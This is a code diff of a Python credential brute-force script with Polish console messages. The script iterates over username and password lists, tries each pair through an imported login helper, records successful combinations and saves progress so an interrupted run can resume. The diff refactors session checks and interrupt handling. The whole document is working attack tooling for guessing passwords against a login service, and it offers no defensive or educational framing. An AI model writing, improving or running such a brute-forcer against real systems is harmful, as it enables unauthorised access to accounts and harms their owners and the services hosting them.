@@ -1,47 +1,44 @@
-import os 
-from utils.brute_utils import create_session, check_server, try_login
+from utils.brute_utils import create_session, try_login
 from utils.files_utils import load_file, save_to_file
-from settings import PASSWORD_FILE, PROGRESS_FILE, SUCCESS_FILE, LOGIN_FILE
+from settings import USERNAMES_FILE, PASSWORDS_FILE, PROGRESS_FILE, SUCCESS_FILE
 
-def check_all_and_run_brute_force():
-    """Główna funkcja do sprawdzenia serwera i uruchomienia ataku brute-force."""
+def run_brute_force():
     session = create_session()
+    if not session:
+        print("[!] Nie udało się utworzyć sesji.")
+        return
 
     known_success = load_file(SUCCESS_FILE, as_set=True)
-    last_combo = load_file(PROGRESS_FILE)[-1] if os.path.exists(PROGRESS_FILE) else None
-
+    progress_list = load_file(PROGRESS_FILE)
+    last_combo = progress_list[-1] if progress_list else None
     resume = last_combo is None
 
-    usernames = load_file(LOGIN_FILE)
-    passwords = load_file(PASSWORD_FILE)
+    usernames = load_file(USERNAMES_FILE)
+    passwords = load_file(PASSWORDS_FILE)
+    if not usernames or not passwords:
+        print("[!] Pliki z loginami lub hasłami są puste.")
+        return
 
-    if not check_server(session):
-        print("[!] Serwer jest niedostępny. Kończę.")
-        exit(1)
-    else:
-        print("[*] Serwer jest dostępny. Rozpoczynam atak.")
-
-    for username in usernames:
-        for password in passwords:
-            try:
+    try:
+        for username in usernames:
+            for password in passwords:
                 combo = f"{username}:{password}"
+
                 if combo in known_success:
                     continue
                 if not resume:
                     if combo == last_combo:
                         resume = True
                     continue
+
                 print(f"[*] Próba: {combo}")
-                save_to_file(PROGRESS_FILE, combo)  
-            except KeyboardInterrupt:
-                print("\n[!] Przerwano przez użytkownika. Zapisuję postęp i kończę.")
                 save_to_file(PROGRESS_FILE, combo)
-                exit(0)
-            except Exception as e:
-                print(f"[!] Wystąpił błąd: {e}. Kontynuuję...")
-                continue
-            
-            try_login(session, known_success, username, password)
+                try_login(session, known_success, username, password)
+
+    except KeyboardInterrupt:
+        print("\n[!] Przerwano przez użytkownika. Zapisuję postęp i kończę.")
+        if combo:
+            save_to_file(PROGRESS_FILE, combo)
 
 if __name__ == "__main__":
-    check_all_and_run_brute_force()
+    run_brute_force()
